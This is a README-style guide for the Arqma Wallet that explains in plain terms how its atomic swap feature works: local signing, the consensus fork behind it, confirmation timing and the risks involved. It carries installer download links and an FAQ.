![Arqma Wallet](assets/banner-article.png)

<h1 align="center">Arqma atomic swaps: what the swap path actually is</h1>

<p align="center">Swapping into ARQ without an exchange, and what the wallet holds after.</p>

<div align="center">
<a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe"><img alt="Windows" src="assets/button-windows.png"></a> <a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg"><img alt="macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-10134a?style=for-the-badge&labelColor=090d16&logo=apple&logoColor=f9fcff"></a> <a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz"><img alt="Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-8c7d47?style=for-the-badge&labelColor=090d16&logo=linux&logoColor=f9fcff"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" src="assets/platform-windows.png"> | Windows 10/11, 64-bit | [`Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe) |
| <img alt="macOS" src="https://img.shields.io/badge/platform-macOS-d6efff?style=flat-square&labelColor=090d16&logo=apple&logoColor=f9fcff"> | macOS Intel or Apple Silicon | [`Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg) |
| <img alt="Linux" src="https://img.shields.io/badge/platform-Linux-d6efff?style=flat-square&labelColor=090d16&logo=linux&logoColor=f9fcff"> | Linux x86_64 | [`Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz) |

</div>

All versions and checksums are on the [Arqma Wallet v0.5.1.2 release page](https://github.com/Arqma-Network/Arqma-Wallet/releases/tag/v0.5.1.2).

> **Only download from this GitHub release page.**

An atomic swap exchanges coins between two chains without either side trusting the other to send first. In this project the swap path exists, it required a consensus change at a published block height, and the screens that use it sign transactions locally on the device.

## What "atomic" is doing in the name

The word describes a property of the exchange rather than a feature of the wallet: either both sides complete or neither does. There is no window in which one party has sent and the other has not.

That property comes from how the two transactions are constructed, not from an intermediary holding funds while the trade settles. There is no custodian in the middle, and therefore no account and no balance held by anyone else.

## What the project records about it

Two facts anchor the subject. The first is a swap-related consensus change at a published block height, recorded in the release notes for the build that introduced it. The second is community work on the swap side, reported in the project's announcement thread. The current release from the [Arqma Wallet v0.5.1.2 release](https://github.com/Arqma-Network/Arqma-Wallet/releases/tag/v0.5.1.2) is the build line those notes belong to.

Neither of those is a promise about liquidity. They establish that the mechanism exists on this chain and that work has been done to connect it to the swap ecosystem, which is a different claim from "there is a market to trade in".

## Why it needed a chain change at all

A swap requires the chain to enforce conditions on spending: a transaction that becomes valid only when another chain's transaction does, or that returns the funds after a window closes.

Those conditions are consensus rules, so adding them is a rule change at a height rather than a feature in an application. That is why the swap work appears in the release notes as a fork rather than as an app update. [Arqma Wallet hard fork update](https://github.com/Arqma-Network/desktop-installation/blob/main/arqma-wallet-after-a-hard-fork.md) covers what a rule change does to a wallet.

## What the wallet's role is

The screens sign locally. That is the whole of the wallet's part: it constructs and signs transactions on the device, and the keys never leave it.

Consequently the wallet is not a counterparty and not a broker. It does not quote a rate, hold an order, or take the other side of a trade. That is the same posture the software takes everywhere: it is not an exchange and cannot buy or sell crypto. [Arqma Wallet privacy guide](https://github.com/Arqma-Network/key-recovery/blob/main/arqma-wallet-privacy-anonymity.md) covers what the local-signing model implies for what a service could observe.

## What a swap is not

It is not an order book. There is no matching engine here, and no price displayed by the wallet that comes from a venue.

It is not a bridge in the custody sense either: nothing is locked with a third party while a representation is issued elsewhere. The exchange is between two parties on two chains, and the atomicity is what replaces the custodian.

## Where the two chains meet

The swap involves another chain, and that is the part this project does not control. Its rules, its confirmation times and its own changes are outside this wallet's design.

That is why the honest description is narrow: the mechanism exists on this side, and the other side is whatever the counterparty's chain supports. [Arqma remote node safety](https://github.com/Arqma-Network/desktop-installation/blob/main/arqma-wallet-remote-node-safety.md) covers the third party that does appear in ordinary use, which is the node rather than a swap counterparty.

## Timing and confirmations

A swap has windows, because the conditions that make it atomic are time-bounded. Blocks on this chain arrive on a two-minute target, and ten confirmations  -  roughly twenty minutes  -  is the point at which wallets and merchants treat a transfer as settled.

Those numbers matter differently in a swap than in a payment: a window measured in blocks is a window measured in minutes here, and an exchange that assumed a slower chain would behave differently.

## The mobile screens

The mobile app presents swap and staking screens, and both sign locally. The app remains what it is: not an exchange, and unable to buy or sell crypto.

That is worth stating because the presence of a swap screen invites the assumption of a service behind it. The screen is an interface to a transaction, not a counter at which someone is holding inventory. [where to buy ARQ](https://github.com/Arqma-Network/payments-and-transfer-fixes/blob/main/arqma-wallet-buy-arq.md) covers the acquisition routes and what each actually does.

## What can go wrong

The failure modes are the ones that belong to any transaction: a counterparty who does not complete their side, though atomicity is what prevents that becoming a loss; a window that closes while a transfer is unconfirmed; and the ordinary risk of sending to a destination that is not what it appeared to be.

The last one is not unique to swaps, and it is the one a user controls. Sends are final, and an address is 95 characters beginning with `ar`. [Arqma Wallet address format](https://github.com/Arqma-Network/payments-and-transfer-fixes/blob/main/arqma-wallet-address-format.md) covers what to check before signing.

## What the wallet will show afterwards

The transfer appears in the wallet once its block has been scanned, and on the chain permanently. A swap that completed is two transactions on two chains, each with its own record.

Neither is reversible. That is a property of both chains rather than of this wallet, and it is why the conditions are enforced at signing time rather than fixed afterwards.

## FAQ

### Does Arqma support atomic swaps?

Yes. The release notes record a swap-related consensus change at a published block height, and the swap screens sign locally.

### Is the wallet acting as an exchange in a swap?

No. It signs transactions on the device; it is not an exchange and cannot buy or sell crypto.

### Why did swaps need a fork?

Because the conditions that make an exchange atomic are consensus rules, and rules change at a height rather than in an app update.

### Does a swap hold my funds with a third party?

No. Atomicity replaces the custodian; there is no account and no held balance.

### How long does a swap take to settle?

Both chains have to confirm. Here blocks target two minutes, and ten confirmations is roughly twenty.

---

## Download Arqma Wallet

<div align="center">
<a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe"><img alt="Windows" src="assets/button-windows.png"></a> <a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg"><img alt="macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-10134a?style=for-the-badge&labelColor=090d16&logo=apple&logoColor=f9fcff"></a> <a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz"><img alt="Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-8c7d47?style=for-the-badge&labelColor=090d16&logo=linux&logoColor=f9fcff"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" src="assets/platform-windows.png"> | Windows 10/11, 64-bit | [`Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe) |
| <img alt="macOS" src="https://img.shields.io/badge/platform-macOS-d6efff?style=flat-square&labelColor=090d16&logo=apple&logoColor=f9fcff"> | macOS Intel or Apple Silicon | [`Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg) |
| <img alt="Linux" src="https://img.shields.io/badge/platform-Linux-d6efff?style=flat-square&labelColor=090d16&logo=linux&logoColor=f9fcff"> | Linux x86_64 | [`Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz) |

</div>

All versions and checksums are on the [Arqma Wallet v0.5.1.2 release page](https://github.com/Arqma-Network/Arqma-Wallet/releases/tag/v0.5.1.2).

> **Only download from this GitHub release page.**

---

## Related Arqma Wallet guides

| Guide | What it answers |
| --- | --- |
| [where to buy ARQ](https://github.com/Arqma-Network/payments-and-transfer-fixes/blob/main/arqma-wallet-buy-arq.md) | Where ARQ trades today and how to read a thin market before buying. |
| [Arqma Wallet download and verify](https://github.com/Arqma-Network/desktop-installation/blob/main/arqma-wallet-download-and-verify.md) | Checking a downloaded installer against its published hash before you run it. |
